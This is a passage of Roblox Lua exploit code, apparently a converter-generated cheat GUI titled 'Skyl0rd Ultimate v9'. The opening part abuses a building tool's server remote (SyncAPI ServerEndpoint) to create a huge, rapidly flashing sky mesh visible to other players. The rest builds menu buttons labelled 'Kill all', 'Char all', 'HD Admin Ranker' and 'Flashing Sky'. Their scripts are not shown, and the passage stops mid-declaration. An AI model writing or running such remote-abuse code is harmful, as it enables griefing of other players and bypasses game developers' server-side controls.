						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local RunService = game:GetService("RunService")
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function CreatePart(cf, parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
	
				function SetAnchor(part, boolean)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
	
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://" .. meshid
							}
						}
					}
					_(args)
				end
	
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = texid
							}
						}
					}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
	
				function SetTransparency(part, value)
					local args = {
						[1] = "SyncTransparency",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = value
							}
						}
					}
					_(args)
				end
	
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
	
				local images = {
					"http://www.roblox.com/asset/?id=169585459",
					"http://www.roblox.com/asset/?id=169585475",
					"http://www.roblox.com/asset/?id=169585485",
					"http://www.roblox.com/asset/?id=169585502",
					"http://www.roblox.com/asset/?id=169585515",
					"http://www.roblox.com/asset/?id=169585502",
					"http://www.roblox.com/asset/?id=169585485",
					"http://www.roblox.com/asset/?id=169585475"
				}
	
				local skyPart
				local skyLoop
				local frameTime = 1 / 10
				local lastUpdate = 0
	
				function CreateSky()
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					local cf = hrp.CFrame
					CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
					local found = false
					for i = 1, 50 do
						task.wait()
						for _, v in workspace:GetDescendants() do
							if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
								skyPart = v
								found = true
								break
							end
						end
						if found then break end
					end
	
					if not skyPart then return end
	
					SetAnchor(skyPart, true)
					AddMesh(skyPart)
					SetMesh(skyPart, "111891702759441")
					MeshResize(skyPart, Vector3.new(8000, 8000, 8000))
					SetTransparency(skyPart, 0)
	
					local index = 1
					skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
						lastUpdate = lastUpdate + deltaTime
						if lastUpdate >= frameTime then
							lastUpdate = 0
							if not skyPart then
								skyLoop:Disconnect()
								return
							end
							SetTexture(skyPart, images[index])
							index = (index % #images) + 1
						end
					end)
				end
	
				function ResetSky()
					if skyLoop then
						skyLoop:Disconnect()
						skyLoop = nil
					end
					if skyPart then
						DestroyPart(skyPart)
						skyPart = nil
					end
					task.spawn(CreateSky)
				end
	
				player.CharacterAdded:Connect(function(newChar)
					char = newChar
					ResetSky()
				end)
	
				if char and char:FindFirstChild("Humanoid") then
					char:WaitForChild("Humanoid").Died:Connect(function()
						ResetSky()
					end)
				end
	
				CreateSky()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
			end)
	
		end;
		task.spawn(C_8);
		-- StarterGui.page 2.Frame.LocalScript
		local function C_9()
			local script = G2L["9"];
			local UserInputService = game:GetService("UserInputService")
			local runService = (game:GetService("RunService"));
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			function Lerp(a, b, m)
				return a + (b - a) * m
			end;
	
			local lastMousePos
			local lastGoalPos
			local DRAG_SPEED = (8); -- // The speed of the UI darg.
			function Update(dt)
				if not (startPos) then return end;
				if not (dragging) and (lastGoalPos) then
					gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
					return 
				end;
	
				local delta = (lastMousePos - UserInputService:GetMouseLocation())
				local xGoal = (startPos.X.Offset - delta.X);
				local yGoal = (startPos.Y.Offset - delta.Y);
				lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
				gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
			end;
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
					lastMousePos = UserInputService:GetMouseLocation()
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			runService.Heartbeat:Connect(Update)
	
		end;
		task.spawn(C_9);
	
		return G2L["1"], require;
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_48);
-- StarterGui.ScreenGui.Frame.page frames.pg4.LocalScript
local function C_4a()
local script = G2L["4a"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
	-- Instances: 72 | Scripts: 32 | Modules: 0 | Tags: 0
	local G2L = {};
	
	-- StarterGui.page2 
	G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
	G2L["1"]["Name"] = [[page2 ]];
	G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
	
	
	-- StarterGui.page2 .Frame
	G2L["2"] = Instance.new("Frame", G2L["1"]);
	G2L["2"]["BorderSizePixel"] = 4;
	G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["2"]["Size"] = UDim2.new(0, 381, 0, 430);
	G2L["2"]["Position"] = UDim2.new(0.57938, 0, 0.31215, 0);
	G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 165, 9);
	
	
	-- StarterGui.page2 .Frame.LocalScript
	G2L["3"] = Instance.new("LocalScript", G2L["2"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame
	G2L["4"] = Instance.new("ScrollingFrame", G2L["2"]);
	G2L["4"]["Active"] = true;
	G2L["4"]["BorderSizePixel"] = 3;
	G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["4"]["Size"] = UDim2.new(0, 383, 0, 432);
	G2L["4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["4"]["Position"] = UDim2.new(-0.00261, 0, 0.00465, 0);
	G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 132, 24);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextLabel
	G2L["5"] = Instance.new("TextLabel", G2L["4"]);
	G2L["5"]["TextWrapped"] = true;
	G2L["5"]["BorderSizePixel"] = 0;
	G2L["5"]["TextSize"] = 14;
	G2L["5"]["TextScaled"] = true;
	G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["5"]["Size"] = UDim2.new(0, 529, 0, 40);
	G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["5"]["Text"] = [[Skyl0rd Ultimate v9]];
	G2L["5"]["Position"] = UDim2.new(-0.22728, 0, -0.00621, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["6"] = Instance.new("TextButton", G2L["4"]);
	G2L["6"]["TextWrapped"] = true;
	G2L["6"]["BorderSizePixel"] = 3;
	G2L["6"]["TextSize"] = 14;
	G2L["6"]["TextScaled"] = true;
	G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["6"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["6"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["6"]["Text"] = [[Fencing Restore]];
	G2L["6"]["Position"] = UDim2.new(0.04524, 0, 0.0811, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["7"] = Instance.new("LocalScript", G2L["6"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["8"] = Instance.new("TextButton", G2L["4"]);
	G2L["8"]["TextWrapped"] = true;
	G2L["8"]["BorderSizePixel"] = 3;
	G2L["8"]["TextSize"] = 14;
	G2L["8"]["TextScaled"] = true;
	G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["8"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["8"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["8"]["Text"] = [[Skyl0rd GUI NEW]];
	G2L["8"]["Position"] = UDim2.new(0.58832, 0, 0.0811, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["9"] = Instance.new("LocalScript", G2L["8"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["a"] = Instance.new("TextButton", G2L["4"]);
	G2L["a"]["TextWrapped"] = true;
	G2L["a"]["BorderSizePixel"] = 3;
	G2L["a"]["TextSize"] = 14;
	G2L["a"]["TextScaled"] = true;
	G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["a"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["a"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["a"]["Text"] = [[Char all]];
	G2L["a"]["Position"] = UDim2.new(0.58832, 0, 0.14828, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["b"] = Instance.new("LocalScript", G2L["a"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["c"] = Instance.new("TextButton", G2L["4"]);
	G2L["c"]["TextWrapped"] = true;
	G2L["c"]["BorderSizePixel"] = 3;
	G2L["c"]["TextSize"] = 14;
	G2L["c"]["TextScaled"] = true;
	G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["c"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["c"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["c"]["Text"] = [[Title]];
	G2L["c"]["Position"] = UDim2.new(0.04524, 0, 0.14828, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["d"] = Instance.new("LocalScript", G2L["c"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["e"] = Instance.new("TextButton", G2L["4"]);
	G2L["e"]["TextWrapped"] = true;
	G2L["e"]["BorderSizePixel"] = 3;
	G2L["e"]["TextSize"] = 14;
	G2L["e"]["TextScaled"] = true;
	G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["e"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["e"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["e"]["Text"] = [[Char all LNicky]];
	G2L["e"]["Position"] = UDim2.new(0.58832, 0, 0.21739, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["f"] = Instance.new("LocalScript", G2L["e"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["10"] = Instance.new("TextButton", G2L["4"]);
	G2L["10"]["TextWrapped"] = true;
	G2L["10"]["BorderSizePixel"] = 3;
	G2L["10"]["TextSize"] = 14;
	G2L["10"]["TextScaled"] = true;
	G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["10"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["10"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["10"]["Text"] = [[Char all gr0undl0rd]];
	G2L["10"]["Position"] = UDim2.new(0.04524, 0, 0.21739, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["11"] = Instance.new("LocalScript", G2L["10"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextLabel
	G2L["12"] = Instance.new("TextLabel", G2L["4"]);
	G2L["12"]["TextWrapped"] = true;
	G2L["12"]["BorderSizePixel"] = 0;
	G2L["12"]["TextSize"] = 14;
	G2L["12"]["TextScaled"] = true;
	G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["12"]["BackgroundTransparency"] = 4532;
	G2L["12"]["Size"] = UDim2.new(0, 529, 0, 20);
	G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["12"]["Text"] = [[Page 4]];
	G2L["12"]["Position"] = UDim2.new(-0.22728, 0, 0.04076, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["13"] = Instance.new("TextButton", G2L["4"]);
	G2L["13"]["TextWrapped"] = true;
	G2L["13"]["BorderSizePixel"] = 3;
	G2L["13"]["TextSize"] = 14;
	G2L["13"]["TextScaled"] = true;
	G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["13"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["13"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["13"]["Text"] = [[Neon All]];
	G2L["13"]["Position"] = UDim2.new(0.04524, 0, 0.29231, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["14"] = Instance.new("LocalScript", G2L["13"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["15"] = Instance.new("TextButton", G2L["4"]);
	G2L["15"]["TextWrapped"] = true;
	G2L["15"]["BorderSizePixel"] = 3;
	G2L["15"]["TextSize"] = 14;
	G2L["15"]["TextScaled"] = true;
	G2L["15"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["15"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["15"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["15"]["Text"] = [[Kill all]];
	G2L["15"]["Position"] = UDim2.new(0.58832, 0, 0.29231, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["16"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["17"] = Instance.new("TextButton", G2L["4"]);
	G2L["17"]["TextWrapped"] = true;
	G2L["17"]["BorderSizePixel"] = 3;
	G2L["17"]["TextSize"] = 14;
	G2L["17"]["TextScaled"] = true;
	G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["17"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["17"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["17"]["Text"] = [[RC7 Cloud]];
	G2L["17"]["Position"] = UDim2.new(0.04263, 0, 0.36413, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["18"] = Instance.new("LocalScript", G2L["17"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["19"] = Instance.new("TextButton", G2L["4"]);
	G2L["19"]["TextWrapped"] = true;
	G2L["19"]["BorderSizePixel"] = 3;
	G2L["19"]["TextSize"] = 14;
	G2L["19"]["TextScaled"] = true;
	G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["19"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["19"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["19"]["Text"] = [[Primadon]];
	G2L["19"]["Position"] = UDim2.new(0.59615, 0, 0.52604, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["1a"] = Instance.new("LocalScript", G2L["19"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["1b"] = Instance.new("TextButton", G2L["4"]);
	G2L["1b"]["TextWrapped"] = true;
	G2L["1b"]["BorderSizePixel"] = 3;
	G2L["1b"]["TextSize"] = 14;
	G2L["1b"]["TextScaled"] = true;
	G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["1b"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["1b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["1b"]["Text"] = [[No Animation]];
	G2L["1b"]["Position"] = UDim2.new(0.58832, 0, 0.36208, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["1d"] = Instance.new("TextButton", G2L["4"]);
	G2L["1d"]["TextWrapped"] = true;
	G2L["1d"]["BorderSizePixel"] = 3;
	G2L["1d"]["TextSize"] = 14;
	G2L["1d"]["TextScaled"] = true;
	G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["1d"]["Size"] = UDim2.new(0, 129, 0, 24);
	G2L["1d"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["1d"]["Text"] = [[Flashing Sky]];
	G2L["1d"]["Position"] = UDim2.new(0.04263, 0, 0.67255, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["1e"] = Instance.new("LocalScript", G2L["1d"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["1f"] = Instance.new("TextButton", G2L["4"]);
	G2L["1f"]["TextWrapped"] = true;
	G2L["1f"]["BorderSizePixel"] = 3;
	G2L["1f"]["TextSize"] = 14;
	G2L["1f"]["TextScaled"] = true;
	G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["1f"]["Size"] = UDim2.new(0, 129, 0, 31);
	G2L["1f"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["1f"]["Text"] = [[1x1x1x1 Revenge]];
	G2L["1f"]["Position"] = UDim2.new(0.59615, 0, 0.58495, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["20"] = Instance.new("LocalScript", G2L["1f"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["21"] = Instance.new("TextButton", G2L["4"]);
	G2L["21"]["TextWrapped"] = true;
	G2L["21"]["BorderSizePixel"] = 3;
	G2L["21"]["TextSize"] = 14;
	G2L["21"]["TextScaled"] = true;
	G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["21"]["Size"] = UDim2.new(0, 129, 0, 30);
	G2L["21"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["21"]["Text"] = [[Shedletsky]];
	G2L["21"]["Position"] = UDim2.new(0.04524, 0, 0.58507, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["22"] = Instance.new("LocalScript", G2L["21"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["23"] = Instance.new("TextButton", G2L["4"]);
	G2L["23"]["TextWrapped"] = true;
	G2L["23"]["BorderSizePixel"] = 3;
	G2L["23"]["TextSize"] = 14;
	G2L["23"]["TextScaled"] = true;
	G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["23"]["Size"] = UDim2.new(0, 129, 0, 25);
	G2L["23"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["23"]["Text"] = [[HD Admin Ranker]];
	G2L["23"]["Position"] = UDim2.new(0.59615, 0, 0.63002, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["24"] = Instance.new("LocalScript", G2L["23"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["25"] = Instance.new("TextButton", G2L["4"]);
	G2L["25"]["TextWrapped"] = true;
	G2L["25"]["BorderSizePixel"] = 3;
	G2L["25"]["TextSize"] = 14;
	G2L["25"]["TextScaled"] = true;
	G2L["25"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["25"]["Size"] = UDim2.new(0, 129, 0, 28);
	G2L["25"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["25"]["Text"] = [[R4DKidd Gui Leak]];
	G2L["25"]["Position"] = UDim2.new(0.04524, 0, 0.63216, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["26"] = Instance.new("LocalScript", G2L["25"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["27"] = Instance.new("TextButton", G2L["4"]);
	G2L["27"]["TextWrapped"] = true;
	G2L["27"]["BorderSizePixel"] = 3;
	G2L["27"]["TextSize"] = 14;
	G2L["27"]["TextScaled"] = true;
	G2L["27"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["27"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["27"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["27"]["Text"] = [[HeadShake]];
	G2L["27"]["Position"] = UDim2.new(0.58832, 0, 0.76143, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["28"] = Instance.new("LocalScript", G2L["27"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["29"] = Instance.new("TextButton", G2L["4"]);
	G2L["29"]["TextWrapped"] = true;
	G2L["29"]["BorderSizePixel"] = 3;
	G2L["29"]["TextSize"] = 14;
	G2L["29"]["TextScaled"] = true;
	G2L["29"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["29"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["29"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["29"]["Text"] = [[Chicken Arms]];
	G2L["29"]["Position"] = UDim2.new(0.04524, 0, 0.76045, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["2a"] = Instance.new("LocalScript", G2L["29"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["2b"] = Instance.new("TextButton", G2L["4"]);
	G2L["2b"]["TextWrapped"] = true;
	G2L["2b"]["BorderSizePixel"] = 3;
	G2L["2b"]["TextSize"] = 14;
	G2L["2b"]["TextScaled"] = true;
	G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["2b"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["2b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["2b"]["Text"] = [[Anti Robloxian]];
	G2L["2b"]["Position"] = UDim2.new(0.58832, 0, 0.88069, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["2c"] = Instance.new("LocalScript", G2L["2b"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
	G2L["2d"] = Instance.new("TextButton", G2L["4"]);
	G2L["2d"]["TextWrapped"] = true;
	G2L["2d"]["BorderSizePixel"] = 3;
	G2L["2d"]["TextSize"] = 14;
	G2L["2d"]["TextScaled"] = true;
	G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
	G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
	G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
	G2L["2d"]["Size"] = UDim2.new(0, 129, 0, 41);
	G2L["2d"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
	G2L["2d"]["Text"] = [[Float Pad]];
	G2L["2d"]["Position"] = UDim2.new(0.58832, 0, 0.82164, 0);
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);
	
	
	
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton
